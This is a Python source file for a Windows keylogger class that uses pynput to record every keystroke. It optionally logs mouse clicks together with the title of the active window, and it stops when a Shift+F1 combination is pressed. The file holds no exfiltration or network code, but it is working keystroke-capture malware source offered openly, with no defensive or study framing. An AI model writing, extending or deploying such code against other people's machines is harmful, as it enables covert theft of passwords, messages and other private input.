import threading, pynput.keyboard, pynput.mouse

from win32gui import GetWindowText, GetForegroundWindow

KEY = pynput.keyboard.Key


class keylogger:
    def __init__(self, log_clicks=False, escape_combo=(KEY.shift, KEY.f1)):
        self.key_log = ""
        self.keylogger_running = False
        self.key_combo = []
        self.escape_combo = list(escape_combo)
        self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)

        self.log_clicks = log_clicks
        if log_clicks: self.mouse_listener = pynput.mouse.Listener(on_click=self.on_click_event); self.window = ""

    def start(self):
        self.key_listener.start()
        self.keylogger_running = True

        if self.log_clicks: self.mouse_listener.start()

    def get_key_log(self):
        return self.key_log

    def clear_key_log(self):
        self.key_log = ""

    def stop_key_logger(self):
        self.key_listener.stop()
        self.keylogger_running = False
        threading.Thread.__init__(self.key_listener)

        if self.log_clicks: self.mouse_listener.stop(); threading.Thread.__init__(self.mouse_listener)

    def on_keyboard_event(self, event):
        if event == KEY.backspace:
            self.key_log += " [Bck] "
        elif event == KEY.tab:
            self.key_log += " [Tab] "
        elif event == KEY.enter:
            self.key_log += "\n"
        elif event == KEY.space:
            self.key_log += " "
        elif type(event) == KEY:  # if the character is some other type of special key
            self.key_log += " [" + str(event)[4:] + "] "
        else:
            self.key_log += str(event)[1:len(str(event)) - 1]  # remove quotes around

        self.check_escape_char(event)

    def check_escape_char(self, key):
        self.key_combo.append(key)
        if key != self.escape_combo[len(self.key_combo) - 1]:
            self.key_combo = []
        else:
            if self.key_combo == self.escape_combo:
                self.stop_key_logger()

    def on_click_event(self, x, y, button, pressed):
        current_window = GetWindowText(GetForegroundWindow())

        if not (self.window == current_window or current_window == ""):
            self.window = current_window
            self.key_log += "\n" + "-" * 5 + f"{self.window}" + "-" * 5 + "\n"
